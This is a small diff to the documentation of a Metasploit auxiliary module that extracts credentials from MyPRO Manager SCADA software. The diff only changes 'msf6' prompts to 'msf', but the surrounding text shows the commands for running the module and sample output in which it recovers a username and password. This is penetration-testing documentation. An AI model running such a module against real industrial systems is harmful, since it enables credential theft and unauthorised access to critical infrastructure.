@@ -31,9 +31,9 @@ A trial version of the software can be obtained from [the vendor](https://www.my
 3. Start `msfconsole` and run the following commands:
 
 ```
-msf6 > use auxiliary/admin/scada/mypro_mgr_creds 
-msf6 auxiliary(admin/scada/mypro_mgr_creds) > set RHOSTS <IP>
-msf6 auxiliary(admin/scada/mypro_mgr_creds) > run 
+msf > use auxiliary/admin/scada/mypro_mgr_creds 
+msf auxiliary(admin/scada/mypro_mgr_creds) > set RHOSTS <IP>
+msf auxiliary(admin/scada/mypro_mgr_creds) > run 
 ```
 
 ## Scenarios
@@ -42,7 +42,7 @@ Running the module against MyPRO Manager v1.3 on Windows 11, should result in an
 following:
 
 ```
-msf6 auxiliary(admin/scada/mypro_mgr_creds) > run
+msf auxiliary(admin/scada/mypro_mgr_creds) > run
 [*] Running module against 192.168.1.78
 
 [*] Running automatic check ("set AutoCheck false" to disable)
@@ -54,7 +54,7 @@ msf6 auxiliary(admin/scada/mypro_mgr_creds) > run
 [+] User: user
 [+] Password: SuperS3cr3t!
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/scada/mypro_mgr_creds) > creds
+msf auxiliary(admin/scada/mypro_mgr_creds) > creds
 Credentials
 ===========
 
